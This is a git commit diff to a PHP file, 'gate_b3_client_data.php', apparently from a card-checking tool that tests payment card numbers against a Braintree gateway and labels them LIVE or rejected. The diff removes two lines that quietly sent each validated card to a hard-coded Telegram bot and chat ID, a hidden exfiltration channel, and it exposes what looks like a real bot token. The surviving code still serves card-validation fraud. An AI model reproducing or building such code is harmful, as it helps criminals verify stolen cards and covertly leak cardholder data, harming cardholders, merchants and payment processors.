3b4742c6a774d69667689d0c05a8f2738dbcf896
Jason Te <39984351+pnrjason@users.noreply.github.com>
2021-01-05 16:49:28 +0800

    Update gate_b3_client_data.php

--- gate_b3_client_data.php
+++ gate_b3_client_data.php
@@ -165,15 +165,9 @@ curl_setopt_array($ch, array(
 
     if(strpos($execute, 'successfully added')){ 
 
-        $data = "Card%3A%20$lista%0AStatus%3A%20%23LIVE%0AMessage%3A%20Authorized%0AGate%3A%20Braintree%201%0ABot%20By%3A%20%40Raizo666";
-        file_get_contents('https://api.telegram.org/bot1445766483:AAGZQdjCZpkj0t4c5AECjObd1hOom0TGBeA/sendMessage?chat_id=1485192243&text='.$data.'');
-
         echo '<tr><td><span class="badge badge-outline-success badge-pill">LIVE</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-success badge-pill">Authorized</span></td></tr><br>';
     }
     elseif(strpos($execute, 'Gateway Rejected: avs')){ 
-
-        $data = "Card%3A%20$lista%0AStatus%3A%20%23LIVE%0AMessage%3A%20Authorized%0AGate%3A%20Braintree%201%0ABot%20By%3A%20%40Raizo666";
-        file_get_contents('https://api.telegram.org/bot1445766483:AAGZQdjCZpkj0t4c5AECjObd1hOom0TGBeA/sendMessage?chat_id=1485192243&text='.$data.'');
 
         echo '<tr><td><span class="badge badge-outline-success badge-pill">LIVE</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-success badge-pill">'.$respo.'</span></td></tr><br>'; 
     }
